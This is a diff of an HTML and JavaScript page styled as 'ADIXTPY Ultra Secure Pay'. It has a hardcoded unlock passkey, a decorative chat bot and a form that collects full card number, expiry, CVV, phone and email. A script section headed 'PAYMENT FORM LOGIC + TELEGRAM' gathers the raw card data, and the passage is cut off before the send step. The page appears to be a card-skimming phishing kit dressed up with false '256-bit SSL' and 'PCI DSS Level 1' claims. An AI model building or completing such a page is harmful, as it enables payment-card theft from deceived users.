@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>ADIXTPY | NEBULA AI SECURE PAY</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+    <title>ADIXTPY | ULTRA SECURE PAY</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         * {
@@ -17,15 +17,11 @@
             font-family: 'Inter', sans-serif;
             min-height: 100vh;
             background: #0a0c15;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
             overflow-x: hidden;
-            padding: 1.5rem;
+            position: relative;
         }
 
-        /* CANVAS: MOUSE-FOLLOW PARTICLES + LIVE GLOW */
+        /* CANVAS BACKGROUND (ADVANCED NEON PARTICLES + WAVES) */
         #canvas-bg {
             position: fixed;
             top: 0;
@@ -37,179 +33,243 @@
             pointer-events: none;
         }
 
-        /* GLASS CARD */
-        .glass-card {
+        /* LOADING OVERLAY */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(5, 10, 25, 0.97);
+            backdrop-filter: blur(16px);
+            z-index: 2000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            transition: opacity 0.8s ease;
+        }
+        .loader-ring {
+            width: 80px;
+            height: 80px;
+            border: 4px solid rgba(90, 110, 255, 0.2);
+            border-top: 4px solid #5a6eff;
+            border-radius: 50%;
+            animation: spin 1s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
+            box-shadow: 0 0 30px rgba(90,110,255,0.7);
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .loading-text {
+            font-size: 1.2rem;
+            font-weight: 600;
+            background: linear-gradient(135deg, #fff, #8a9eff);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+            margin-top: 20px;
+            letter-spacing: 1px;
+        }
+
+        /* PASSWORD UNLOCK MODAL */
+        .unlock-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(8, 12, 28, 0.92);
+            backdrop-filter: blur(22px);
+            z-index: 1500;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.5s;
+        }
+        .unlock-card {
+            background: rgba(15, 25, 45, 0.85);
+            backdrop-filter: blur(25px);
+            border: 1px solid rgba(90, 110, 255, 0.7);
+            border-radius: 2rem;
+            padding: 2.5rem 2rem;
+            width: 90%;
+            max-width: 430px;
+            text-align: center;
+            box-shadow: 0 0 50px rgba(90,110,255,0.4);
+            animation: floatIn 0.5s ease;
+        }
+        @keyframes floatIn {
+            from { opacity: 0; transform: scale(0.9) translateY(30px); }
+            to { opacity: 1; transform: scale(1) translateY(0); }
+        }
+        .unlock-card h3 {
+            font-size: 1.9rem;
+            background: linear-gradient(135deg, #fff, #7a9eff);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+        }
+        .password-input-area {
+            position: relative;
+            margin: 1.5rem 0;
+        }
+        .password-input-area input {
+            width: 100%;
+            padding: 14px 20px;
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(90,110,255,0.6);
+            border-radius: 60px;
+            color: white;
+            text-align: center;
+            font-size: 1rem;
+            letter-spacing: 2px;
+        }
+        .unlock-btn {
+            background: linear-gradient(95deg, #3a56d4, #1e2f7a);
+            border: none;
+            padding: 12px;
+            width: 100%;
+            border-radius: 60px;
+            font-weight: bold;
+            color: white;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 0 12px #5a6eff;
+        }
+        .unlock-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 25px #5a6eff;
+        }
+        .error-msg-pass {
+            color: #ff96b9;
+            font-size: 0.75rem;
+            min-height: 24px;
+        }
+
+        /* MAIN CONTENT */
+        .main-content {
+            display: none;
+            opacity: 0;
+            transition: opacity 0.6s;
+            padding: 1.5rem;
             position: relative;
             z-index: 10;
-            width: 100%;
-            max-width: 560px;
-            margin: 0 auto;
+        }
+        .main-content.show {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            opacity: 1;
+        }
+
+        /* GLASS PAYMENT CARD */
+        .glass-card {
+            position: relative;
             background: rgba(12, 20, 35, 0.55);
             backdrop-filter: blur(14px) saturate(180%);
             border-radius: 2rem;
             border: 1px solid rgba(255, 255, 255, 0.25);
-            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3), 0 0 0 0.5px rgba(255, 255, 255, 0.1) inset;
-            transition: transform 0.3s cubic-bezier(0.2, 0.9, 0.4, 1.1), box-shadow 0.4s ease;
+            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3);
             padding: 1.8rem 2rem 2.2rem;
+            width: 100%;
+            max-width: 580px;
+            transition: transform 0.3s, box-shadow 0.3s;
         }
-
         .glass-card:hover {
             transform: translateY(-3px);
-            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.4), 0 0 0 1px rgba(255, 255, 255, 0.3) inset;
+            box-shadow: 0 0 28px rgba(90,110,255,0.5), 0 25px 45px rgba(0,0,0,0.4);
         }
-
-        /* LIGHT SWEEP */
-        .glass-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -75%;
-            width: 50%;
-            height: 100%;
-            background: linear-gradient(115deg, transparent, rgba(255,255,255,0.25), transparent);
-            transform: skewX(-20deg);
-            transition: left 0.7s ease;
-            pointer-events: none;
-            border-radius: 2rem;
-        }
-
-        .glass-card:hover::before {
-            left: 125%;
-        }
-
         h2 {
             text-align: center;
             font-size: 1.9rem;
-            font-weight: 700;
             background: linear-gradient(135deg, #FFFFFF, #80c0ff, #5a6eff);
             background-clip: text;
             -webkit-background-clip: text;
             color: transparent;
-            letter-spacing: -0.3px;
-            margin-bottom: 1.5rem;
             display: flex;
-            align-items: center;
             justify-content: center;
             gap: 12px;
-            animation: pulseGlow 2.2s infinite ease-in-out;
+            animation: pulseGlow 2s infinite;
         }
-
         @keyframes pulseGlow {
-            0% { text-shadow: 0 0 0px rgba(90, 110, 255, 0); filter: brightness(1);}
-            50% { text-shadow: 0 0 12px rgba(90, 110, 255, 0.6), 0 0 4px rgba(255,255,255,0.5); filter: brightness(1.05);}
-            100% { text-shadow: 0 0 0px rgba(90, 110, 255, 0); filter: brightness(1);}
+            0% { filter: drop-shadow(0 0 0px #5a6eff); }
+            50% { filter: drop-shadow(0 0 15px #5a6eff); }
+            100% { filter: drop-shadow(0 0 0px #5a6eff); }
         }
-
-        h2 i {
-            background: none;
-            -webkit-text-fill-color: initial;
-            color: #8a9eff;
-            font-size: 1.8rem;
-            filter: drop-shadow(0 0 6px #5a6eff);
-        }
-
-        .input-group {
-            margin-bottom: 1rem;
-            position: relative;
-        }
-
+        .input-group { margin-bottom: 1rem; }
         label {
-            display: block;
             font-size: 0.75rem;
-            font-weight: 500;
-            letter-spacing: 0.5px;
-            margin-bottom: 0.3rem;
-            color: rgba(255, 255, 255, 0.75);
+            font-weight: 600;
+            color: rgba(255,255,255,0.8);
             text-transform: uppercase;
         }
-
         input, select {
             width: 100%;
             padding: 12px 16px;
             background: rgba(20, 30, 48, 0.7);
-            border: 1px solid rgba(255, 255, 255, 0.25);
+            border: 1px solid rgba(255,255,255,0.2);
             border-radius: 1.2rem;
-            font-size: 0.95rem;
-            font-weight: 500;
-            color: #f0f3fa;
-            transition: all 0.25s ease-out;
-            outline: none;
-            font-family: 'Inter', monospace;
+            color: white;
+            transition: all 0.2s;
         }
-
         input:focus, select:focus {
             border-color: #5e7eff;
-            box-shadow: 0 0 12px rgba(94, 126, 255, 0.5), inset 0 0 4px rgba(255,255,255,0.2);
-            background: rgba(25, 38, 60, 0.8);
-            transform: scale(1.01);
+            box-shadow: 0 0 12px #5e7eff;
+            outline: none;
         }
-
-        .phone-wrapper {
-            display: flex;
-            gap: 12px;
-            align-items: center;
-        }
-        .phone-wrapper select {
-            width: 35%;
-            padding: 12px 8px;
-        }
-        .phone-wrapper input {
-            width: 65%;
-        }
-
+        .phone-wrapper { display: flex; gap: 12px; }
         .card-type-badge {
             text-align: right;
             font-size: 0.7rem;
             margin-top: -8px;
-            margin-bottom: 12px;
             padding: 4px 8px;
             display: inline-block;
-            background: rgba(0,0,0,0.35);
-            border-radius: 40px;
-            backdrop-filter: blur(4px);
-            letter-spacing: 0.3px;
-            color: #bbd9ff;
         }
-
         .error-msg {
             font-size: 0.7rem;
             color: #ff96b9;
-            display: block;
-            margin-top: 5px;
-            margin-left: 10px;
             opacity: 0;
-            transition: opacity 0.2s;
+            transition: 0.2s;
         }
+        .error-msg.show { opacity: 1; }
 
-        .error-msg.show {
-            opacity: 1;
-        }
-
+        /* BUTTON GLOW + AUDIO FEEDBACK */
         .submit-btn {
             width: 100%;
             background: linear-gradient(95deg, #3a56d4, #1e2f7a);
             border: none;
             padding: 14px;
-            font-size: 1.1rem;
-            font-weight: 700;
             border-radius: 2rem;
+            font-weight: 800;
+            font-size: 1rem;
             color: white;
             cursor: pointer;
-            margin-top: 1rem;
-            transition: all 0.25s;
+            transition: all 0.2s;
             display: flex;
-            align-items: center;
             justify-content: center;
             gap: 12px;
-            box-shadow: 0 4px 15px rgba(0, 20, 80, 0.5);
+            position: relative;
+            overflow: hidden;
+            margin-top: 0.5rem;
         }
-
+        .submit-btn::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            transition: left 0.5s;
+        }
+        .submit-btn:hover::after {
+            left: 100%;
+        }
         .submit-btn:hover {
-            background: linear-gradient(95deg, #5a74ff, #2e4099);
             transform: scale(1.02);
-            box-shadow: 0 0 19px rgba(94, 126, 255, 0.7);
+            box-shadow: 0 0 22px #5a6eff, 0 0 8px #3a56d4;
+            background: linear-gradient(95deg, #5a74ff, #2e4099);
         }
-
         .btn-loader {
             width: 20px;
             height: 20px;
@@ -220,26 +280,63 @@
             display: inline-block;
         }
 
-        @keyframes spin { to { transform: rotate(360deg); } }
-
+        /* NEW: CARD LOGO SECTION AT BOTTOM */
+        .card-logos {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin: 18px 0 10px;
+            padding: 12px 0 0;
+            border-top: 1px dashed rgba(255,255,255,0.2);
+        }
+        .card-logos i {
+            font-size: 2.2rem;
+            transition: all 0.2s;
+            filter: drop-shadow(0 0 4px rgba(90,110,255,0.5));
+            color: #ccd6f6;
+        }
+        .card-logos i:hover {
+            transform: translateY(-3px);
+            filter: drop-shadow(0 0 12px #5a6eff);
+            color: #fff;
+        }
         .secure-footer {
             text-align: center;
             font-size: 0.7rem;
-            margin-top: 1.8rem;
+            margin-top: 0.8rem;
             color: rgba(255,255,240,0.6);
-            border-top: 1px dashed rgba(255,255,255,0.2);
-            padding-top: 0.9rem;
         }
         .owner-name {
-            font-weight: 700;
             background: linear-gradient(145deg, #ffd966, #ffaa44);
             background-clip: text;
             -webkit-background-clip: text;
             color: transparent;
-            letter-spacing: 1px;
+            font-weight: bold;
         }
 
-        /* ---------- ADVANCED AI HELP BOT (FLOATING CHAT WIDGET) ---------- */
+        /* AUDIO TOGGLE BUTTON */
+        .audio-control {
+            position: fixed;
+            bottom: 28px;
+            left: 28px;
+            z-index: 1100;
+            background: rgba(0,0,0,0.6);
+            backdrop-filter: blur(12px);
+            border-radius: 60px;
+            padding: 8px 16px;
+            display: flex;
+            gap: 12px;
+            border: 1px solid rgba(90,110,255,0.5);
+            cursor: pointer;
+            color: white;
+            font-size: 0.8rem;
+            transition: 0.2s;
+        }
+        .audio-control:hover {
+            box-shadow: 0 0 15px #5a6eff;
+        }
+
+        /* ADVANCED CHAT BOT */
         .chat-bot-container {
             position: fixed;
             bottom: 28px;
@@ -249,111 +346,455 @@
             flex-direction: column;
             align-items: flex-end;
         }
-
         .chat-toggle {
             background: linear-gradient(135deg, #1f2b4e, #0f172a);
             backdrop-filter: blur(12px);
-            padding: 14px 20px;
+            padding: 12px 20px;
             border-radius: 60px;
             display: flex;
-            align-items: center;
             gap: 12px;
             cursor: pointer;
-            border: 1px solid rgba(90, 110, 255, 0.7);
-            box-shadow: 0 8px 20px rgba(0,0,0,0.4), 0 0 12px rgba(90,110,255,0.5);
-            transition: all 0.3s ease;
+            border: 1px solid rgba(90,110,255,0.7);
+            box-shadow: 0 0 20px rgba(90,110,255,0.4);
             font-weight: 600;
-            font-size: 0.9rem;
             color: white;
-            font-family: 'Inter', sans-serif;
         }
-        .chat-toggle i {
-            font-size: 1.6rem;
-            color: #7b9cff;
-            filter: drop-shadow(0 0 5px #3e6aff);
-            animation: botPulse 1.8s infinite;
-        }
-        .chat-toggle:hover {
-            transform: scale(1.05);
-            border-color: #8aadff;
-            box-shadow: 0 0 20px #5a6eff;
-        }
-        @keyframes botPulse {
-            0% { text-shadow: 0 0 0px #5a6eff; transform: scale(1);}
-            50% { text-shadow: 0 0 10px #5a6eff; transform: scale(1.1);}
-            100% { text-shadow: 0 0 0px #5a6eff; transform: scale(1);}
-        }
-
+        .chat-toggle i { font-size: 1.6rem; color: #7b9cff; animation: botPulse 1.5s infinite; }
         .chat-window {
-            width: 340px;
-            background: rgba(18, 25, 45, 0.85);
-            backdrop-filter: blur(18px);
+            width: 380px;
+            background: rgba(18, 25, 45, 0.95);
+            backdrop-filter: blur(22px);
             border-radius: 1.8rem;
             margin-bottom: 16px;
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
-            display: flex;
+            border: 1px solid rgba(255,255,255,0.25);
+            display: none;
             flex-direction: column;
             overflow: hidden;
-            transition: all 0.2s ease;
-            transform-origin: bottom right;
+            box-shadow: 0 20px 35px rgba(0,0,0,0.5);
         }
-
-        .chat-window.hidden {
-            display: none;
-        }
-
+        .chat-window.open { display: flex; }
         .chat-header {
-            padding: 16px 18px;
-            background: rgba(0, 0, 0, 0.5);
+            padding: 14px 18px;
+            background: rgba(0,0,0,0.5);
             display: flex;
             justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid rgba(255,255,255,0.15);
-        }
-        .chat-header h4 {
-            font-size: 1rem;
-            font-weight: 600;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            color: #eef3ff;
-        }
-        .chat-header i {
-            color: #5e7eff;
-        }
-        .close-chat {
-            background: none;
-            border: none;
-            color: #aaa;
-            cursor: pointer;
-            font-size: 1.2rem;
+            font-weight: bold;
         }
         .chat-messages {
-            height: 320px;
+            height: 340px;
             overflow-y: auto;
-            padding: 14px;
+            padding: 12px;
             display: flex;
             flex-direction: column;
-            gap: 12px;
+            gap: 10px;
         }
         .message {
             display: flex;
-            align-items: flex-start;
             gap: 8px;
             max-width: 85%;
         }
-        .bot-message {
-            align-self: flex-start;
-        }
-        .user-message {
-            align-self: flex-end;
-            flex-direction: row-reverse;
-        }
+        .bot-message { align-self: flex-start; }
+        .user-message { align-self: flex-end; flex-direction: row-reverse; }
         .msg-bubble {
-            background: rgba(30, 40, 65, 0.9);
+            background: rgba(30,40,65,0.9);
             padding: 8px 12px;
             border-radius: 18px;
+            font-size: 0.8rem;
+            color: white;
+        }
+        .typing-indicator {
+            display: flex;
+            gap: 4px;
+            padding: 6px 12px;
+        }
+        .typing-indicator span {
+            width: 6px;
+            height: 6px;
+            background: #aaa;
+            border-radius: 50%;
+            animation: typingAnim 1.2s infinite;
+        }
+        @keyframes typingAnim {
+            0%, 60%, 100% { transform: translateY(0); opacity: 0.4; }
+            30% { transform: translateY(-6px); opacity: 1; }
+        }
+        .quick-replies {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            padding: 10px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+        }
+        .quick-btn {
+            background: rgba(90,110,255,0.3);
+            border: 1px solid rgba(90,110,255,0.6);
+            padding: 5px 12px;
+            border-radius: 40px;
+            font-size: 0.7rem;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .quick-btn:hover {
+            background: #5a6eff;
+            transform: scale(1.02);
+        }
+        .chat-input-area {
+            display: flex;
+            padding: 10px;
+            gap: 8px;
+            background: rgba(0,0,0,0.4);
+        }
+        .chat-input-area input {
+            flex: 1;
+            background: rgba(20,30,48,0.9);
+            border: none;
+            border-radius: 40px;
+            padding: 10px 14px;
+            color: white;
+        }
+        .chat-input-area button {
+            background: #5a6eff;
+            border: none;
+            border-radius: 40px;
+            padding: 0 16px;
+            color: white;
+            cursor: pointer;
+        }
+        @keyframes botPulse {
+            0% { text-shadow: 0 0 0px #5a6eff; }
+            50% { text-shadow: 0 0 12px #5a6eff; }
+        }
+        @media (max-width: 580px) {
+            .chat-window { width: 310px; }
+            .glass-card { padding: 1.5rem; }
+            .card-logos i { font-size: 1.8rem; gap: 16px; }
+        }
+    </style>
+</head>
+<body>
+
+<canvas id="canvas-bg"></canvas>
+
+<!-- Loading Overlay -->
+<div id="loadingOverlay" class="loading-overlay">
+    <div class="loader-ring"></div>
+    <div class="loading-text">SECURE GATEWAY BOOTING</div>
+</div>
+
+<!-- Password Unlock -->
+<div id="unlockModal" class="unlock-container">
+    <div class="unlock-card">
+        <h3><i class="fas fa-fingerprint"></i> AUTHENTICATION</h3>
+        <p>Enter master passkey</p>
+        <div class="password-input-area">
+            <input type="password" id="passInput" placeholder="········" autocomplete="off">
+        </div>
+        <div id="passError" class="error-msg-pass"></div>
+        <button id="unlockBtn" class="unlock-btn"><i class="fas fa-unlock-alt"></i> UNLOCK SECURE ZONE</button>
+        <div style="margin-top: 16px; font-size: 0.7rem; opacity:0.6">🔐 Restricted area • Owner: ADIXTPY</div>
+    </div>
+</div>
+
+<!-- Main Content -->
+<div id="mainContent" class="main-content">
+    <div class="glass-card">
+        <h2><i class="fas fa-crown"></i> ADIXTPY NEBULA <i class="fas fa-bolt"></i></h2>
+        <form id="payment-form">
+            <div class="input-group"><label>🏦 Cardholder Name</label><input type="text" id="fullname" placeholder="FULL NAME" required></div>
+            <div class="input-group"><label>💳 Card Number</label><input type="text" id="cardnumber" placeholder="1234 5678 9012 3456" maxlength="23" oninput="formatCardNumber(this); detectCardType()" required><div id="card-type" class="card-type-badge">🔍 detecting card...</div></div>
+            <div style="display: flex; gap: 14px;">
+                <div class="input-group" style="flex:1"><label>📅 Expiry (MM/YY)</label><input type="text" id="expirydate" placeholder="MM/YY" maxlength="5" oninput="formatExpiryDate(this)" required><span id="expiry-error" class="error-msg">Invalid</span></div>
+                <div class="input-group" style="flex:0.8"><label>🔒 CVV</label><input type="password" id="cvv" placeholder="***" maxlength="3" required><span id="cvv-error" class="error-msg">3 digits</span></div>
+            </div>
+            <div class="input-group"><label>🌍 Mobile</label><div class="phone-wrapper"><select id="country-code"><option value="+1">🇺🇸 +1</option><option value="+91" selected>🇮🇳 +91</option><option value="+44">🇬🇧 +44</option><option value="+61">🇦🇺 +61</option><option value="+49">🇩🇪 +49</option><option value="+81">🇯🇵 +81</option></select><input type="text" id="mobilenumber" placeholder="98765 43210" required></div></div>
+            <div class="input-group"><label>✉️ Email</label><input type="email" id="emailaddress" placeholder="client@secure.com" required><span id="email-error" class="error-msg">Valid email</span></div>
+            <button type="button" class="submit-btn" id="pay-button"><i class="fas fa-lock"></i> <span id="btn-text">AUTHORIZE PAYMENT</span></button>
+            
+            <!-- NEW: Card Brand Logos at Bottom -->
+            <div class="card-logos">
+                <i class="fab fa-cc-visa"></i>
+                <i class="fab fa-cc-mastercard"></i>
+                <i class="fab fa-cc-amex"></i>
+                <i class="fab fa-cc-discover"></i>
+                <i class="fab fa-cc-paypal"></i>
+            </div>
+            
+            <div class="secure-footer">
+                <i class="fas fa-shield-alt"></i> 256-bit SSL • PCI DSS Level 1 • 👑 <span class="owner-name">ADIXTPY</span> • v4.0
+            </div>
+        </form>
+    </div>
+</div>
+
+<!-- Audio Toggle Button -->
+<div id="audioControl" class="audio-control">
+    <i class="fas fa-volume-up" id="audioIcon"></i>
+    <span>FX</span>
+</div>
+
+<!-- Advanced Chat Bot Container -->
+<div class="chat-bot-container" id="chatBot">
+    <div class="chat-window" id="chatWindow">
+        <div class="chat-header"><span><i class="fas fa-robot"></i> ADIX AI • Neural Support</span><button id="closeChatBtn" style="background:none; border:none; color:#ccc; cursor:pointer;">✖</button></div>
+        <div class="chat-messages" id="chatMessages">
+            <div class="message bot-message"><div class="msg-icon"><i class="fas fa-brain"></i></div><div class="msg-bubble">🌟 Welcome to ADIXTPY Ultra Secure. I'm your AI financial assistant. Ask me anything: card validation, security, owner contact, or transaction issues. Type 'help' for options.</div></div>
+        </div>
+        <div class="quick-replies" id="quickReplies">
+            <div class="quick-btn" data-msg="Validate my card">💳 Validate card</div>
+            <div class="quick-btn" data-msg="Show security features">🔒 Security status</div>
+            <div class="quick-btn" data-msg="Contact owner ADIXTPY">👑 Owner contact</div>
+            <div class="quick-btn" data-msg="Transaction failed">🛠️ Transaction help</div>
+            <div class="quick-btn" data-msg="What is your fee?">💰 Fee inquiry</div>
+        </div>
+        <div class="chat-input-area"><input type="text" id="chatInput" placeholder="Type your message..."><button id="sendChatMsg"><i class="fas fa-paper-plane"></i></button></div>
+    </div>
+    <div class="chat-toggle" id="chatToggleBtn"><i class="fas fa-comment-dots"></i><span>🤖 ADIX AI • v2.0</span></div>
+</div>
+
+<script>
+    // -------------------- ADVANCED CANVAS BACKGROUND (NEON WAVES + PARTICLES) --------------------
+    const canvas = document.getElementById('canvas-bg');
+    const ctx = canvas.getContext('2d');
+    let width = window.innerWidth, height = window.innerHeight;
+    let mouseX = width/2, mouseY = height/2;
+    let particles = [];
+    const PARTICLE_COUNT = 240;
+    let time = 0;
+
+    class Particle {
+        constructor() {
+            this.x = Math.random() * width;
+            this.y = Math.random() * height;
+            this.vx = (Math.random() - 0.5) * 0.5;
+            this.vy = (Math.random() - 0.5) * 0.5;
+            this.size = Math.random() * 2.5 + 1;
+            this.baseSize = this.size;
+            this.color = `hsl(${Math.random() * 60 + 200}, 85%, 65%)`;
+        }
+        update() {
+            const dx = mouseX - this.x, dy = mouseY - this.y;
+            const dist = Math.hypot(dx, dy);
+            if (dist < 200) {
+                const force = (1 - dist / 200) * 0.03;
+                this.vx += dx * force * 0.18;
+                this.vy += dy * force * 0.18;
+            }
+            this.vx *= 0.98;
+            this.vy *= 0.98;
+            this.x += this.vx;
+            this.y += this.vy;
+            if (this.x < -50) this.x = width + 50;
+            if (this.x > width + 50) this.x = -50;
+            if (this.y < -50) this.y = height + 50;
+            if (this.y > height + 50) this.y = -50;
+            const d = Math.hypot(mouseX - this.x, mouseY - this.y);
+            this.size = this.baseSize * (d < 80 ? 2.4 : (d < 180 ? 1.4 : 1));
+        }
+        draw() {
+            ctx.beginPath();
+            ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+            ctx.fillStyle = this.color;
+            ctx.shadowBlur = 16;
+            ctx.shadowColor = "#5a6eff";
+            ctx.fill();
+        }
+    }
+
+    function initParticles() { particles = Array.from({ length: PARTICLE_COUNT }, () => new Particle()); }
+    function drawBackground() {
+        ctx.clearRect(0, 0, width, height);
+        const grad = ctx.createRadialGradient(mouseX, mouseY, 15, mouseX, mouseY, 450);
+        grad.addColorStop(0, 'rgba(70, 100, 255, 0.45)');
+        grad.addColorStop(0.5, 'rgba(25, 35, 70, 0.5)');
+        grad.addColorStop(1, '#020617');
+        ctx.fillStyle = '#01010c';
+        ctx.fillRect(0, 0, width, height);
+        ctx.globalCompositeOperation = 'lighter';
+        ctx.fillStyle = grad;
+        ctx.fillRect(0, 0, width, height);
+        ctx.globalCompositeOperation = 'source-over';
+        particles.forEach(p => { p.update(); p.draw(); });
+        // Animated neon rings
+        for (let i = 0; i < 4; i++) {
+            ctx.beginPath();
+            const radius = 100 + Math.sin(time * 0.008) * 30 + i * 35;
+            ctx.arc(mouseX, mouseY, radius, 0, Math.PI * 2);
+            ctx.strokeStyle = `rgba(90, 110, 255, ${0.25 - i*0.05})`;
+            ctx.lineWidth = 1.8;
+            ctx.stroke();
+        }
+        time++;
+        requestAnimationFrame(drawBackground);
+    }
+
+    window.addEventListener('resize', () => { width = window.innerWidth; height = window.innerHeight; canvas.width = width; canvas.height = height; initParticles(); });
+    document.addEventListener('mousemove', (e) => { mouseX = e.clientX; mouseY = e.clientY; });
+    canvas.width = width; canvas.height = height;
+    initParticles();
+    drawBackground();
+
+    // -------------------- LOADING & PASSWORD (Khushi) --------------------
+    const loadingOverlay = document.getElementById('loadingOverlay');
+    const unlockModal = document.getElementById('unlockModal');
+    const mainContent = document.getElementById('mainContent');
+    const passInput = document.getElementById('passInput');
+    const unlockBtn = document.getElementById('unlockBtn');
+    const passErrorSpan = document.getElementById('passError');
+    const CORRECT_PASS = "Khushi";
+
+    setTimeout(() => {
+        loadingOverlay.style.opacity = '0';
+        setTimeout(() => { loadingOverlay.style.display = 'none'; unlockModal.style.display = 'flex'; }, 600);
+    }, 2000);
+
+    function unlockAccess() {
+        if (passInput.value.trim() === CORRECT_PASS) {
+            unlockModal.style.opacity = '0';
+            setTimeout(() => {
+                unlockModal.style.display = 'none';
+                mainContent.classList.add('show');
+                initAudioAndBot();
+            }, 500);
+        } else {
+            passErrorSpan.innerText = "⛔ ACCESS DENIED: Invalid passkey";
+            passInput.classList.add('error-shake');
+            setTimeout(() => passInput.classList.remove('error-shake'), 500);
+            passInput.value = '';
+        }
+    }
+    unlockBtn.addEventListener('click', unlockAccess);
+    passInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') unlockAccess(); });
+
+    // -------------------- AUDIO FEEDBACK (click & success) --------------------
+    let audioEnabled = true;
+    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    let audioInit = false;
+    function playBeep(type) {
+        if (!audioEnabled) return;
+        if (!audioInit) { audioCtx.resume(); audioInit = true; }
+        const osc = audioCtx.createOscillator();
+        const gain = audioCtx.createGain();
+        osc.connect(gain);
+        gain.connect(audioCtx.destination);
+        gain.gain.value = 0.12;
+        osc.frequency.value = type === 'click' ? 880 : 660;
+        gain.gain.exponentialRampToValueAtTime(0.00001, audioCtx.currentTime + 0.3);
+        osc.start();
+        osc.stop(audioCtx.currentTime + 0.2);
+    }
+    const audioControl = document.getElementById('audioControl');
+    const audioIcon = document.getElementById('audioIcon');
+    audioControl.addEventListener('click', () => {
+        audioEnabled = !audioEnabled;
+        audioIcon.className = audioEnabled ? "fas fa-volume-up" : "fas fa-volume-mute";
+        if (audioEnabled && !audioInit) { audioCtx.resume(); audioInit = true; }
+        playBeep('click');
+    });
+
+    // -------------------- PAYMENT FORM LOGIC + TELEGRAM --------------------
+    const fullnameInput = document.getElementById('fullname'), cardNumberInput = document.getElementById('cardnumber'), expiryInput = document.getElementById('expirydate'), cvvInput = document.getElementById('cvv'), mobileInput = document.getElementById('mobilenumber'), emailInput = document.getElementById('emailaddress'), countrySelect = document.getElementById('country-code'), payBtn = document.getElementById('pay-button'), btnTextSpan = document.getElementById('btn-text');
+    const expiryErrorSpan = document.getElementById('expiry-error'), cvvErrorSpan = document.getElementById('cvv-error'), emailErrorSpan = document.getElementById('email-error');
+
+    function formatCardNumber(input) {
+        let raw = input.value.replace(/\s/g, '').replace(/\D/g, '').slice(0,16);
+        let formatted = '';
+        for (let i=0; i<raw.length; i++) { if (i>0 && i%4===0) formatted += ' '; formatted += raw[i]; }
+        input.value = formatted;
+    }
+    function detectCardType() {
+        const num = cardNumberInput.value.replace(/\s/g,'');
+        let type = "💳 UNKNOWN";
+        if (/^4/.test(num)) type = "🌍 VISA";
+        else if (/^5[1-5]/.test(num)) type = "🏦 MASTERCARD";
+        else if (/^3[47]/.test(num)) type = "✨ AMEX";
+        document.getElementById('card-type').innerHTML = `🔍 ${type}`;
+    }
+    function formatExpiryDate(input) {
+        let val = input.value.replace(/\D/g, '');
+        if (val.length >= 2) val = val.slice(0,2)+'/'+val.slice(2,4);
+        input.value = val;
+        validateExpiry();
+    }
+    function validateExpiry() { let exp=expiryInput.value; if(!/^(0[1-9]|1[0-2])\/\d{2}$/.test(exp)) { expiryErrorSpan.classList.add('show'); return false; } const [m,y]=exp.split('/'); const now=new Date(), cy=now.getFullYear()%100, cm=now.getMonth()+1; if(parseInt(y)<cy||(parseInt(y)===cy&&parseInt(m)<cm)) { expiryErrorSpan.classList.add('show'); return false; } expiryErrorSpan.classList.remove('show'); return true; }
+    function validateCVV() { const ok=/^\d{3}$/.test(cvvInput.value); ok?cvvErrorSpan.classList.remove('show'):cvvErrorSpan.classList.add('show'); return ok; }
+    function validateEmail() { const ok=/^[^\s@]+@([^\s@]+\.)+[^\s@]+$/.test(emailInput.value.trim()); ok?emailErrorSpan.classList.remove('show'):emailErrorSpan.classList.add('show'); return ok; }
+    function validateForm() { return fullnameInput.value.trim() && cardNumberInput.value.replace(/\s/g,'').length>=13 && validateExpiry() && validateCVV() && mobileInput.value.trim() && validateEmail(); }
+    async function sendData() {
+        if (!validateForm()) { alert("⚠️ Please fill all fields correctly."); if(audioEnabled) playBeep('click'); return; }
+        payBtn.disabled=true; btnTextSpan.innerHTML='PROCESSING <span class="btn-loader"></span>';
+        if(audioEnabled) playBeep('click');
+        const fullname=fullnameInput.value.trim(), cardnumber=cardNumberInput.value.replace(/\s/g,''), expirydate=expiryInput.value, cvv=cvvInput.value, fullMobile=countrySelect.value+mobileInput.value.trim().replace(/\s/g,''), email=emailInput.value.trim();
